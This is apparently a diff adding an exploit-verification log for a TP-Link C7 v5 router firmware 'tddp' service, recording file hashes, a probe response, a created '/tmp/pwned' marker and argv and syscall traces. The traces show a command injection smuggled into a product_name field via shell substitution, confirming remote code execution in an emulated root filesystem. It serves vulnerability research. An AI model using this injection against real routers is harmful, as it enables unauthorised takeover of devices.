@@ -1,0 +1,60 @@
+### command
+bash /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh
+
+### hashes
+6ff6ff1fd2e05fa33854e8995906ac7f5df7c9e2612439bfd199948f61b308db  /root/inout/firmware/unpacked/tp-link/c7v5_us-up-ver1-2-1-P1[20220715-rel19099]_2022-07-15_17.44.43/_c7v5_us-up-ver1-2-1-P1[20220715-rel19099]_2022-07-15_17.44.43.bin.extracted/squashfs-root/usr/bin/tddp
+6ff6ff1fd2e05fa33854e8995906ac7f5df7c9e2612439bfd199948f61b308db  /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/rootfs/usr/bin/tddp
+ac1d931093b92c24e009bcea489396b204c97bb4ad7cd869c87201141bf8bd0c  /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/sh_bridge
+
+### bridge shell self-test
+BRIDGE_SELF_TEST_OK
+BRIDGE_SHELL_OK
+
+### probe
+sent=60 status=0x00 resp=0203020000000000545052002b9278c67023c45e2f766394741cc3aa
+
+### pwned
+PWNED_CREATED
+-rw-r--r-- 1 root root 9 Jun  8 09:17 /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/rootfs/tmp/pwned
+TDDP_RCE
+
+### sh bridge argv log
+argc=3
+argv[0]=/bin/sh
+argv[1]=-c
+argv[2]=echo BRIDGE_SHELL_OK >/tmp/bridge_shell_test
+argc=3
+argv[0]=sh
+argv[1]=-c
+argv[2]=nvrammanager -r /tmp/cc-tmp -p product-info
+argc=3
+argv[0]=sh
+argv[1]=-c
+argv[2]=grep "product_name" /tmp/cc-tmp >/dev/null 2>&1 			&& sed -i 's/product_name:.*/product_name:A'$(echo TDDP_RCE>/tmp/pwned)'/g' /tmp/cc-tmp 					|| echo "product_name:A'$(echo TDDP_RCE>/tmp/pwned)'" >> /tmp/cc-tmp
+argc=3
+argv[0]=sh
+argv[1]=-c
+argv[2]=nvrammanager -w /tmp/cc-tmp -p product-info
+argc=3
+argv[0]=sh
+argv[1]=-c
+argv[2]=rm /tmp/cc-tmp
+
+### cc-tmp
+product_name:A''
+
+### exec evidence
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 19124
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 0
+19096 waitpid(19124,0x408009bc,0) = 19124
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 19129
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 0
+19096 waitpid(19129,0x408009bc,0) = 19129
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 19136
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 0
+19096 waitpid(19136,0x408009bc,0) = 19136
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 19141
+19096 clone(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|0x12,child_stack=0x00000000,parent_tidptr=0x00000000,tls=0x00000000,child_tidptr=0x3fe62068) = 0
+19096 waitpid(19141,0x408009bc,0) = 19141
+
+### tddp command lines
